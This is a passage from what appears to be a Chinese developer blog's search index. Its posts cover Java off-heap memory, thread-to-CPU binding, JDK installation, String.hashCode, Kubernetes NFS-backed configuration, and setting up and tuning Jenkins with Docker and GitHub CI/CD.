n_Mat(); 堆外分配的内存不受JVM的内存管理。由于又没有主动调用Mat.realse()去释放堆外内存，导致堆外内存OOM。\n其实解决的办法很简单，可以在Mat对象使用完毕后直接调用Mat.realse()释放堆外内存。（没有试过，本人使用的下面的方式）\n但是，Mat对象充斥着整个项目，要跟踪Mat对象的生命周期显得有点复杂，而且因为太多地方使用了Mat对象，很有可能遗漏调用Mat.realse()释放内存。因此，还是想把这部分内存的释放交由JVM来做，具体的方式是：定期的调用System.gc()执行垃圾回收（很多人说System.gc()只是建议JVM执行垃圾回收，并不是命令，是否执行取决去JVM自己，但是，经我实测，每次调用System.gc()都会触发垃圾回收。），JVM在垃圾回收前会执行每个**空java对象（null）**的finalize()方法，而Mat对象的finalize()方法正好实现了释放内存的逻辑：\n@Override protected void finalize() throws Throwable { n_delete(nativeObj); super.finalize(); } // native support for java finalize()  private static native void n_delete(long nativeObj); 因为会定时的调用System.gc()触发Full GC, 而Full GC的之前会调用那些不再被引用的Mat对象的finalize()方法释放它的堆外内存，所以间接的实现了由JVM释放堆外内存的目的。\n但是，这种做法并不好，因为通过System.gc()强制定期执行Full GC，势必会影响java应用本身。\n为何一定要复制到DirectByteBuffer来读写（系统调用）？\nGC会回收无用对象，同时还会进行碎片整理，移动对象在内存中的位置，来减少内存碎片。DirectByteBuffer不受GC控制。如果不用DirectByteBuffer而是用HeapByteBuffer，如果在调用系统调用时，发生了GC，导致HeapByteBuffer内存位置发生了变化，但是内核态并不能感知到这个变化导致系统调用读取或者写入错误的数据。所以一定要通过不受GC影响的DirectByteBuffer来进行IO系统调用。\n假设我们要从网络中读入一段数据，再把这段数据发送出去的话，采用Non-direct ByteBuffer的流程是这样的：\n网络 –\u0026gt; 临时的DirectByteBuffer –\u0026gt; 应用 Non-direct ByteBuffer –\u0026gt; 临时的Direct ByteBuffer –\u0026gt; 网络 这种方式是直接在堆外分配一个内存(即，native memory)来存储数据， 程序通过JNI直接将数据读/写到堆外内存中。因为数据直接写入到了堆外内存中，所以这种方式就不会再在JVM管控的堆内再分配内存来存储数据了，也就不存在堆内内存和堆外内存数据拷贝的操作了。这样在进行I/O操作时，只需要将这个堆外内存地址传给JNI的I/O的函数就好了。\n采用Direct ByteBuffer的流程是这样的：\n网络 –\u0026gt; 应用 Direct ByteBuffer –\u0026gt; 网络 参考： JDK核心JAVA源码解析（4） - 堆外内存、零拷贝、DirectByteBuffer以及针对于NIO中的FileChannel的思考 Java 内存之直接内存（堆外内存） 10 双刃剑：合理管理 Netty 堆外内存 Java直接内存是属于内核态还是用户态？ 堆外内存 之 DirectByteBuffer 详解 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/java%E5%A0%86%E5%A4%96%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA/","series":["Manual"],"tags":["Java"],"title":"Java堆外内存溢出"},{"categories":["编程思想"],"content":" 绑定核心之后不存在线程的上下文切换，就可以更好的利用CPU缓存。\n 不知道你是啥感觉，但是我第一次看到这个问题的时候，我是懵逼的。\n而且它还是一个面试题。\n我懵逼倒不是因为我不知道答案，而是恰好我之前在非常机缘巧合的情况下知道了答案。\n我感觉非常的冷门，作为一个考察候选者的知识点出现在面试环节中不太合适，除非是候选者主动提起做过这样的优化。\n而且怕就怕面试官也是恰巧在某个书上或者博客中知道这个东西，稍微的看了一下，以为自己学到了绝世武功，然后拿出去考别人。\n这样不合适。\n说回这个题目。\n正常来说，其实应该是属于考察操作系统的知识点范畴。\n但是面试官呢又特定的加了“在 Java 中如何实现”。\n那我们就聊聊这个问题。\nJava线程 在聊如何绑定之前，先铺垫一个相关的背景知识：Java线程的实现。\n其实我们都知道 Thread 类的大部分方法都是 native 方法：\n在 Java 中一个方法被声明为 native 方法，绝大部分情况下说明这个方法没有或者不能使用平台无关的手段来实现。\n说明需要操作的是很底层的东西了，已经脱离了 Java 语言层面的范畴。\n抛开 Java 语言这个大前提，实现线程主要是有三种方式：\n 1.使用内核线程实现（1:1实现） 2.使用用户线程实现（1:N实现） 3.使用用户线程加轻量级进程混合实现（N:M实现）\n 这三种实现方案，在《深入理解Java虚拟机》的 12.4 小节有详细的描述，有兴趣的同学可以去仔细的翻阅一下。\n总之，你要知道的是虽然有这三种不同的线程模型，但是 Java 作为上层应用，其实是感知不到这三种模型之间的区别的。\nJVM 规范里面也没有规定，必须使用哪一种模型。\n因为操作系统支持是怎样的线程模型，很大程度上决定了运行在上面的 Java 虚拟机的线程怎样去映射，但是这一点在不同的平台上很难达成一致。\n所以JVM 规范里面没有、也不好去规定 Java 线程需要使用哪种线程模型来实现。\n同时关于本文要讨论的话题，我在知乎上也找到了类似的问题：\n https://www.zhihu.com/question/64072646/answer/216184631  这里面有一个R大的回答，大家可以看看一下。\n他也是先从线程模型的角度铺垫了一下。\n我这里主要说一下使用内核线程实现（1:1实现）的这个模型。\n因为我们用的最多的 HotSpot 虚拟机，就是采用 1:1 模型来实现 Java 线程的。\n这是个啥意思呢？\n说人话就是一个 Java 线程是直接映射为一个操作系统原生线程的，中间没有额外的间接结构。HotSpot 虚拟机也不干涉线程的调度，这事全权交给底下的操作系统去做。\n顶多就是设置一个线程优先级，操作系统来调度的时候给个建议。\n但是何时挂起、唤醒、分配时间片、让那个处理器核心去执行等等这些关于线程生命周期、执行的东西都是操作系统干的。\n这话不是我说的，是R大和周佬都说过这样的话。\n https://www.zhihu.com/question/64072646/answer/216184631  关于 1:1 的线程模型，大家记住书上的这幅图就行：\n LWP：Light Weight Process 轻量级进程\nKLT：Kernal-Level Thread 内核线程\nUT：User Thread 用户线程\n 内核线程就是直接由操作系统内核支持的线程，这种线程由内核来完成线程切换，内核通过操纵调度器对线程进行调度，并负责将线程的任务映射到各个处理器上。\n然后你看上面的图片，KLT 线程上面都有一个 LWP 与之对应。\n啥是 LWP 呢？\n程序一般来说不会直接使用内核线程，而是使用内核线程的一种高级接口，即轻量级进程（LWP），轻量级进程就是我们通常意义上说的线程。\n然后大家记住书上的下面这段话，可以说是 Java 多线程实现的基石理论之一：\n由于内核线程的支持，每个轻量级进程都成为一个独立的调度单元，即使其中某一个轻量级进程在系统调用中被阻塞了，也不会影响整个进程继续工作。\n但是，轻量级进程也具有它的局限性。\n首先，由于是基于内核线程实现的，所以各种线程操作，如创建、析构及同步，都需要进行系统调用。而系统调用的代价相对较高，需要在用户态（User Mode）和内核态（Kernel Mode）中来回切换。\n其次，每个轻量级进程都需要一个内核线程的支持，因此轻量级进程要消耗一定的内核资源（如内核线程的栈空间），因此一个系统支持轻量级进程的数量是有限的。\n好的，终于铺垫完成了。\n前面说了这么多，其实就是为了表达一个观点：\n 不论从什么角度来说，绑定线程到某个 CPU 上去执行都像是操作系统层面干的事儿。Java 作为高级开发语言，肯定是直接干不了的。需要更加底层的开发语言，Java 通过 JNA 技术去调用。\n 在R大的回答中也提到了解决方案：\n 在Linux上的话，可以用taskset来把线程绑在某个指定的核上。\n在Java层面上，有大大写了个现成的库来利用taskset绑核： OpenHFT/Java-Thread-Affinity 有兴趣的话可以参考一下。\n Java-Thread-Affinity 这个开源项目其实就是面试题的答案。\n https://github.com/OpenHFT/Java-Thread-Affinity  项目里面有个问答，解答了如何使用它去做绑核的操作：\n话不多说，直接上效果演示吧。\n先把依赖搞到项目里面去：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;net.openhft\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;affinity\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 然后来个 main 方法：\npublic static void main(String[] args) { try (AffinityLock affinityLock = AffinityLock.acquireLock(5)) { // do some work while locked to a CPU.  while(true) {} } } 按照 git 上的描述，我在方法里面写了一个死循环，为的是更好的演示效果。\n上面的意思就是我要在第 5 个 CPU 线程执行死循环，把 CPU 利用率打到 100%。\n来看一下效果。\n这是没有程序启动之前：\n这是启动起来之后：\n立竿见影，CUP 5 马上就被打满了。\n同时还有两行日志输出，我截出来给你看一下：\n另外，说明一下这个项目对应的 Maven 版本还是有好多个的：\n在我的机器上，如果用高于 3.2.3 的版本就会出现这样的异常信息：\n感觉是版本冲突了，反正没去深究，如果你也想跑一下，我就提醒一下而已。\n效果我们现在是看到了，可以说这个项目非常的溜，可以实现把线程绑定到指定核心上去。\n该功能也是有实际应用场景的，属于一直非常极致的性能优化手段吧。\n绑定核心之后就可以更好的利用缓存以及减少线程的上下文切换。\n说到这就不得不提起我第一次知道“绑核”这个骚操作的场景了。\n那是举行于 2018 年的首届数据库性能大赛，或者更加出名一点的名字叫做天池大赛。\n那一届比赛，我去打了个酱油，成绩非常拉胯就不提了。\n但是我去仔细的看了前几名的赛后分享，大家的思路都是大同小异的。\n我又不得不小声的叨叨一句：那一届比赛打到最后已经变成了开发语言层面上、参数配置上的差距了。C++ 天然优势，所以可以看到排在前面的清一色的 C++ 选手。\n很多支队伍都提到了一个小细节，那就是绑核。\n而我第一次知道这个开源项目，就是通过这篇文章《PolarDB数据库性能大赛Java选手分享》\n当时把他的参赛代码拉下来看了一下，对于绑核操作有了一个基础认识，但是其实也没有深究实现。\n只是这样写就对了，就能绑上就完事了。\n再后来，我看 disruptor 这个框架的时候，看到它有一个这样的等待策略：\n com.lmax.disruptor.BusySpinWaitStrategy\n 这个策略上有这样的一个注释：\n It is best used when threads can be bound to specific CPU cores.\n 如果你要用这个策略，最好是线程可以被绑定到特定的 CPU 核心上。\n就这样，奇怪的知识又被唤醒了。\n我知道怎么绑定啊，Java-Thread-Affinity 这个开源项目就做了。\n于是问题就变成了：它是怎么做呢？\n怎么做的 具体怎么做的，只写几个关键的点，简单的分析一下，大家有兴趣的可以把源码拉下看。\n首先第一个点：JNA 对于 Java-Thread-Affinity 非常重要：\n可以说其实 Java-Thread-Affinity 就是套了个 Java 皮，这种应该让操作系统来做的事，其实编写更加底层的 C++ 或者 C 语言来实现的。\n所以这个项目实质上是基于 JNA 调用了 DLL 文件，从而实现绑核的需求。\n具体对应的代码是这样的：\n net.openhft.affinity.Affinity\n 首先在这个类的静态代码块判断操作系统的类型：\n我这里是 win 操作系统。\n net.openhft.affinity.IAffinity\n 是一个接口，有各个平台的线程亲和性实现：\n比如，在实现类 WindowsJNAAffinity 里面，你可以看到在它的静态代码块里面调用了这样的逻辑：\n net.openhft.affinity.impl.WindowsJNAAffinity.CLibrary\n 这里就是通过前面说的，通过 JNA 调用 kernel32.dll 文件。\n在 windows 平台上能使用该功能的一些的基石就是在此。\n第二个点：怎么绑定到指定核心上？\n在其核心类里面有这样的一个方法：\n net.openhft.affinity.AffinityLock#acquireLock(int)\n 这里的入参，就是第几个 CPU 的意思，记得 CPU 编号是从 0 开始。\n但 0 不建议使用：\n所以程序里面也控制了不能绑定到 0 号 CPU 上。\n最终会走到这个方法中：\n net.openhft.affinity.AffinityLock#bind(boolean)\n 这里采用的是 BitSet，想绑定到第几个 CPU 就把第几个 CPU 的位置设置为 true。\n在 win 平台上会调用这个方法：\n net.openhft.affinity.impl.WindowsJNAAffinity.CLibrary#SetThreadAffinityMask\n 这个方法，就是限制线程在哪个 CPU 上运行的 API。\n https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-setthreadaffinitymask?redirectedfrom=MSDN  第三个点：Solaris 平台怎么实现的？\n因为我们知道，在 Solaris 平台上的 HotSpot 虚拟机，同时支持 1:1 和 N:M 的线程模型。\n那么按理来说得提供两套绑定方案，于是我点进去一看，好家伙：\n大道至简，直接来一个不实现。\n第四个点：有谁用了？\nNetty 里面用到了这个库：\n https://ifeve.com/thread-affinity/  SOFAJRaft 里面也依赖了这个包：\n https://github.com/sofastack/sofa-jraft/blob/master/README_zh_CN.md  然后我前面说到的比赛中也有这样的使用场景，在知乎也看到了这样的一个场景：\n好了，文章写到这里也就可以收尾了。\n你再想想这个面试题，如果面试官想要的真的是这个回答，你说合适吗？\n而且你说你问这干啥，自己家啥业务场景啊，掂量掂量，需要优化到这个级别？\n难道是高频交易？\n人招进来后，可能线程池都看不到几个，你说是吧？\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/java%E5%A6%82%E4%BD%95%E7%BB%91%E5%AE%9A%E7%BA%BF%E7%A8%8B%E5%88%B0%E6%8C%87%E5%AE%9Acpu%E4%B8%8A%E6%89%A7%E8%A1%8C/","series":["Manual"],"tags":["Java"],"title":"Java如何绑定线程到指定CPU上执行"},{"categories":["编程思想"],"content":"1. 下载JDK 进入Oracle 官方网站 下载合适的 JDK 版本，准备安装。\n2. 创建目录 执行如下命令，在 /usr/ 目录下创建 java 目录。\nmkdir /usr/java cd /usr/java 将下载的文件 jdk-8u151-linux-x64.tar.gz 复制到 /usr/java/ 目录下。\n3. 解压 JDK tar -zxvf jdk-8u151-linux-x64.tar.gz 4. 设置环境变量 set java environment JAVA_HOME=/usr/java/jdk1.8.0_151 JRE_HOME=/usr/java/jdk1.8.0_151/jre CLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin export JAVA_HOME JRE_HOME CLASS_PATH PATH 使修改生效：\nsource /etc/profile 5. 测试 执行如下命令进行测试。\njava -version 若显示 Java 版本信息，则说明 JDK 安装成功：\njava version \u0026#34;1.8.0_151\u0026#34; Java(TM) SE Runtime Environment (build 1.8.0_151-b12) Java HotSpot(TM) 64-Bit Server VM (build 25.151-b12, mixed mode) ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/java%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97/","series":["Manual"],"tags":["Java"],"title":"Java安装指南"},{"categories":["编程思想"],"content":"java中的Object类的hashCode方法是一个native方法，查看native源码过于困难，所以暂且认为 Object类的hashCode生成规则是：hash(对象的内存地址+一些其他信息)\njava中String类的 hashCode方法 比较直观，源码如下：\npublic int hashCode() { int h = hash; if (h == 0 \u0026amp;\u0026amp; value.length \u0026gt; 0) { char val[] = value; for (int i = 0; i \u0026lt; value.length; i++) { h = 31 * h + val[i]; } hash = h; } return h; } 生成规则：s[0]*31^(n-1) + s[1]*31^(n-2) + \u0026hellip; + s[n-1]\n为什么是素数31？\n素数：根据素数的特点，一个数与素数相乘，得到结果只能被1、这个数、素数本身整除。因此，按照 s[0]*31^(n-1) + s[1]*31^(n-2) + \u0026hellip; + s[n-1] 生成的hashCode越不容易发生碰撞。\n31：哈希计算速度快。可用移位和减法来代替乘法。现代的VM可以自动完成这种优化，如31 * i = (i \u0026laquo; 5) - i。\n参考：\nhttps://juejin.im/post/5ba75d165188255c6a043b96 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/java%E5%AF%B9%E8%B1%A1%E7%9A%84hashcode%E6%96%B9%E6%B3%95/","series":["Manual"],"tags":["Java"],"title":"Java对象的hashCode方法"},{"categories":["云原生"],"content":"Java应用从nfs加载配置文件\n背景 配置文件变化，无需重新构建镜像部署。\n1. 准备nfs 1、准备好nfs服务器。参考：nfs安装 的nfs服务端配置。 2、k8s node节点可以不启用rpcbind服务，但是必须安装nfs-utils（yum install nfs-utils），否则nfs-client-provisioner pod无法启动，因为nfs-client.yaml里面有nfs的相关配置，而这些nfs配置要生效需依赖nfs-utils。参考：nfs安装 的nfs客户端配置。\n2. 创建StorageClass对象 理论部分参考：StorageClass 2.1 nfs-client.yaml kind: Deployment apiVersion: apps/v1 metadata: name: nfs-client-provisioner spec: replicas: 1 strategy: type: Recreate selector: matchLabels: app: nfs-client-provisioner template: metadata: labels: app: nfs-client-provisioner spec: serviceAccountName: nfs-client-provisioner containers: - name: nfs-client-provisioner image: quay.io/external_storage/nfs-client-provisioner:latest volumeMounts: - name: nfs-client-root mountPath: /persistentvolumes env: - name: PROVISIONER_NAME value: fuseim.pri/ifs - name: NFS_SERVER value: nfs - name: NFS_PATH value: /mnt/nfs/k8s volumes: - name: nfs-client-root nfs: server: nfs path: /mnt/nfs/k8s  k8s node节点可以不启用rpcbind服务，但必须安装nfs-utils。\n 2.2 nfs-client-sa.yaml apiVersion: v1 kind: ServiceAccount metadata: name: nfs-client-provisioner --- kind: ClusterRole apiVersion: rbac.authorization.k8s.io/v1 metadata: name: nfs-client-provisioner-runner rules: - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;persistentvolumes\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;delete\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;persistentvolumeclaims\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;update\u0026#34;] - apiGroups: [\u0026#34;storage.k8s.io\u0026#34;] resources: [\u0026#34;storageclasses\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;events\u0026#34;] verbs: [\u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;patch\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;endpoints\u0026#34;] verbs: [\u0026#34;create\u0026#34;, \u0026#34;delete\u0026#34;, \u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;patch\u0026#34;, \u0026#34;update\u0026#34;] --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: run-nfs-client-provisioner subjects: - kind: ServiceAccount name: nfs-client-provisioner namespace: default roleRef: kind: ClusterRole name: nfs-client-provisioner-runner apiGroup: rbac.authorization.k8s.io 2.3 nfs-client-class.yaml apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: nfs-storage provisioner: fuseim.pri/ifs # or choose another name, must match deployment\u0026#39;s env PROVISIONER_NAME\u0026#39; 现在我们来创建这些资源对象吧：\n$ kubectl create -f nfs-client.yaml $ kubectl create -f nfs-client-sa.yaml $ kubectl create -f nfs-client-class.yaml 创建完成后查看下资源状态：\n$ kubectl get pods NAME READY STATUS RESTARTS AGE ... nfs-client-provisioner-7648b664bc-7f9pk 1/1 Running 0 7h ... $ kubectl get storageclass NAME PROVISIONER AGE course-nfs-storage fuseim.pri/ifs 11s 3. 创建PVC对象 kind: PersistentVolumeClaim apiVersion: v1 metadata: name: ceres-admin-server-nfs-pvc annotations: volume.beta.kubernetes.io/storage-class: \u0026#34;nfs-storage\u0026#34; spec: accessModes: - ReadWriteMany resources: requests: storage: 32Mi 查看pvc：\n[root@k8s-master StorageClass]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE ceres-admin-server-nfs-pvc Bound pvc-fec62c86-451e-4125-9e00-be60394f40d9 32Mi RWX nfs-storage 3h13m ceres-app-server-nfs-pvc Bound pvc-6367fbb5-bc9c-4a75-a5a4-0a555172a6fd 32Mi RWX nfs-storage 53m 自动生成了一个关联的 PV 对象，访问模式是 RWX，回收策略是 Delete，这个 PV 对象并不是我们手动创建的吧，这是通过我们上面的 StorageClass 对象自动创建的：\n[root@k8s-master StorageClass]# kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE pvc-6367fbb5-bc9c-4a75-a5a4-0a555172a6fd 32Mi RWX Delete Bound default/ceres-app-server-nfs-pvc nfs-storage 55m pvc-fec62c86-451e-4125-9e00-be60394f40d9 32Mi RWX Delete Bound default/ceres-admin-server-nfs-pvc nfs-storage 3h14m 4. 拷贝配置文件到nfs共享目录 创建pvc之后就能在nfs看到已经生成相应的共享目录。\n共享目录命名规则如下：\n 自动创建的 PV 以${namespace}-${pvcName}-${pvName}这样的命名格式创建在 NFS 服务器上的共享数据目录中 而当这个 PV 被回收后会以archieved-${namespace}-${pvcName}-${pvName}这样的命名格式存在 NFS 服务器上。  形如下图所示： 5. 使用PVC apiVersion: apps/v1 kind: Deployment metadata: labels: app: ceres-admin-server name: ceres-admin-server-deployment spec: replicas: 1 selector: matchLabels: app: ceres-admin-server template: metadata: labels: app: ceres-admin-server spec: containers: - command: - java - \u0026#39;-jar\u0026#39; - /root/app.jar - \u0026#39;--spring.config.location=/root/config/\u0026#39; - \u0026#39;--spring.profiles.active=prod\u0026#39; image: anaham-docker.pkg.coding.net/cereshop/ceres/ceres-admin-server name: ceres-admin-server ports: - containerPort: 9000 volumeMounts: - mountPath: /root/config/ name: ceres-admin-server-nfs-pvc workingDir: /root imagePullSecrets: - name: coding-regcred volumes: - name: ceres-admin-server-nfs-pvc persistentVolumeClaim: claimName: ceres-admin-server-nfs-pvc 更新配置文件后删除pod，让k8s重新创建pod即可让修改配置生效，从而避免重新构建镜像。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/java%E5%BA%94%E7%94%A8%E4%BB%8Enfs%E5%8A%A0%E8%BD%BD%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"Java应用从nfs加载配置文件"},{"categories":["持续集成部署"],"content":"持续集成/持续部署的重要性不必多言，都什么年代了，没有哪个正紧项目还在人工构建/测试/部署。本文手把手教你搭建Jenkins+docker+腾讯云容器仓库+github的CI/CD环境。妥妥的干活，绝对是解放生产力的利器。架构图如下：\nstep1: 程序猿git push代码到github step2: jenkins通过github webhooks触发任务（ jenkins构建项目，并制作docker镜像） step3: 推送镜像到容器仓库 step4: 应用服务器拉去镜像到本地运行\n为了不让文章篇幅过长，本系列tony老师将文章分成两个小章节：\nGithub webhooks+Jenkins搭建持续集成环境 第一章节，意在教您通过github webhooks+jenkins搭建持续集成环境，如果您已经完成webhooks+jenkins的配置，可以直接调整到第二章节\n1. github配置Personal access tokens 没什么好说的，按图操作：\n记下生成的token，待会儿要用的。\n2. github配置webhooks 去到你的github项目仓库，按图操作：\n这里的Payload URL = 你的jenkins地址+/github-webhook/\n至此，github上的配置全部完成。接下来，我们配置jenkins。\n 3. jenkins配置凭据 这里的Secret就是在第1节配置的Personal access tokens\n 添加一个github登陆凭据，username和password对应github的登陆账号密码。 添加一个宿主机登陆凭据，username和password对应登陆的账号密码（因为小编的jenkins是容器的方式运行的，因此后面需要这个凭据ssh到宿主机上执行命令）。  4. 配置ssh sites 接下来配置一个ssh sites，用于后面需要ssh到宿主机。\n5. 配置jenkins运行环境 这里的环境取决与你的项目需要的环境。\n如果你的jenkins是直接运行在机器上，那么指定对应环境的路径即可。如果是运行在容器里面，容器启动的时候把宿主机的环境映射到容器即可。\n6. 新建一个maven项目 本小节以一个maven项目为例子，下一个小节我还补充了vue项目的例子。\n请按图操作：\n请按图操作：\n请按图操作：\n这里对上图解释一下：上图的含义是，当maven构建完项目之后，制作docker镜像，并推送到远程容器仓库。当然，你也可以构建完项目之后，直接java -jar本地运行，这一切取决于你的需求！！！\n7. 新建一个vue项目 你的前端可能是通过vue实现前后端分离的，那么你肯定也存在对vue编译构建的需求。\n这里大部分配置和第5小节是一样的，不再赘述，需要注意的是：\n上图中command的含义是: 1. 构建项目 2. 运行项目 3. 制作镜像 4，推送镜像到仓库。同第5节的maven项目一样，需要哪些步骤取决于你的需求。\n通过本文，您已经掌握了当开发人员提交代码到github之后，jenkins自动构建项目/运行项目的持续集成方法。\n本系列文章的jenkins+腾讯云容器仓库+docker持续部署 将教你将构建好的项目制作成docker镜像，并由真正的应用服务器去运行项目，真正实现CI/CD，解放生产力。\nJenkins+腾讯云容器仓库+docker持续部署 第二章节，意在教您通过jenkins+腾讯云容器仓库+docker搭建持续部署环境，如果您还没有完成webhooks+jenkins的配置，请完成第一章节的学习\n1. 准备 在上一个章节的基础上，您首先要：\n jenkins添加您应用服务器的登陆凭证（参照第一章第3小节） jenkins添加您应用服务器的ssh sites（参照第一章第4小节） 开通腾讯云容器服务（免费开通镜像仓库基本教程 ） 本章的项目源码来自yshop意象商城系统   2. 项目增加docker配置 2.1 h5项目新增docker配置 新增如下3个配置：构建镜像脚本build-image.sh、镜像定义Dockerfile-h5、推送到容器仓库脚本push.sh\n 2.2 后台管理前端项目新增docker配置 新增如下3个配置：\n 2.3 后台项目新增docker配置 新增如下10个配置：\n 3. 修改项目配置文件 修改mysql的地址为“db”,redis的地址为“redis”,mysql链接新增 allowPublicKeyRetrieval=true\u0026amp;useSSL=false参数\n4. jenkins配置 如果您已经完成了第一章中的配置，那您只需要新增一小部分配置即可。\n4.1 新增h5项目的Execute shell script on remote host using ssh  jenkins宿主机构建镜像并push到容器仓库 ssh到应用服务器下载镜像并启动项目  4.2 新增前端项目的Execute shell script on remote host using ssh  jenkins宿主机构建镜像并push到容器仓库 ssh到应用服务器下载镜像并启动项目  4.3 新增后台项目的Execute shell script on remote host using ssh  jenkins宿主机构建镜像并push到容器仓库 ssh到应用服务器下载镜像并启动项目  5. 启动 5.1 修改docker-compose-env.yml中mysql的密码 5.2 启动项目 #启动运行环境 docker-compose -f docker-compose-env.yml up \u0026amp; #建数据库 cp ~/repository/yshop/sql/yshop2.0.sql /data/mysql/log docker exec -it mysql bash cd /var/log/mysql mysql -uroot -proot create database yshop; use yshop; source yshop2.0.sql exit; #启动 system/api/h5/admin docker-compose -f docker-compose-app.yml up \u0026amp; 5.3 nginx配置 将app.conf文件放到/data/nginx/vhost目录\ndocker-compose restart -f docker-compose-env.yml nginx  注意⚠️：\n需要替换server_name成你自己域名 项目源码中的api默认是https的，如果你没有ssl证书，或者嫌麻烦，请自行改成http。\n 至此，您已经完成全部配置，提交代码即可自动完成构建/部署/运行，当然你也可以在jenkins上手动点击构建。\n6. 配置文件 配置文件下载：\nhttps://pan.baidu.com/s/1KQT3vRgYXby3FHPViejzhQ 提取码：hrqs\n ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cicd/jenkins+docker+%E8%85%BE%E8%AE%AF%E4%BA%91%E5%AE%B9%E5%99%A8%E4%BB%93%E5%BA%93+github%E6%90%AD%E5%BB%BAcicd%E7%8E%AF%E5%A2%83/","series":null,"tags":["Jenkins","docker"],"title":"Jenkins+Docker+腾讯云容器仓库+Github搭建CI/CD环境.md"},{"categories":["持续集成部署"],"content":"Jenkins使用使用注意事项\n1. 无法通过execute shell启动进程 这是因为Jenkins默认会在Build结束后Kill掉所有的衍生进程。\n在执行shell前需要设置BUILD_ID=dontKillMe\nBUILD_ID=dontKillMe cd /data/wwwroot/yxshop chmod +x ./*.sh nohup ./restart.sh \u0026gt;/data/wwwroot/yxshop/nohup.out 2\u0026gt;\u0026amp;1 \u0026amp; 2. github向jenkins deliver失败 一开始填写的Payload URL形如，\nPayload URL = https://xxx.com/github-webhook 无论怎么修改再redeliver都失败，后来修改为形如，\nPayload URL = https://xxx.com/github-webhook/ 仅仅是在后面加了“/”。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cicd/jenkins%E4%BD%BF%E7%94%A8%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","series":null,"tags":["Jenkins"],"title":"Jenkins使用使用注意事项"},{"categories":["持续集成部署"],"content":"Jenkins安装插件提速\n国内安装Jenkins插件缓慢，这是我见到最完美的解决方案。 通过【插件\u0026ndash;\u0026gt;高级\u0026ndash;\u0026gt;更新网站】替换成清华的数据源（https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json）并不好使\n需要按照如下步骤操作：\n进入到工作目录 $ cd {你的Jenkins工作目录}/updates #进入更新配置位置 修改default.json 方法1 $ vim default.json 替换所有插件下载的url\n:1,$s/http:\\/\\/updates.jenkins-ci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g 替换连接测试url\n:1,$s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g 进入vim先输入：然后再粘贴上边的：后边的命令，注意不要写两个冒号！\n修改完成保存退出:wq\n方法2 使用sed\n$ sed -i \u0026#39;s/http:\\/\\/updates.jenkins-ci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g\u0026#39; default.json \u0026amp;\u0026amp; sed -i \u0026#39;s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g\u0026#39; default.json 这是直接修改的配置文件，如果前边Jenkins用sudo启动的话，那么这里的两个sed前均需要加上sudo\n重启Jenkins，安装插件试试，简直超速！！\nhttps://www.cnblogs.com/hellxz/p/jenkins_install_plugins_faster.html ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cicd/jenkins%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6%E6%8F%90%E9%80%9F/","series":null,"tags":["Jenkins"],"title":"Jenkins安装插件提速"},{"categories":["编程思想"],"content":"JIT (just-in-time compilation) 是指程序在运行过程中对热点代码进行编译的过程，编译后的机器码存入CodeCache，下次再遇到这段代码，就会从CodeCache中读取机器码，直接执行，以此来提升程序运行的性能。\n有的JVM全程都是JIT编译运行，例如：JRockit；有的JVM是解释器 + JIT运行，例如：HotSpot, 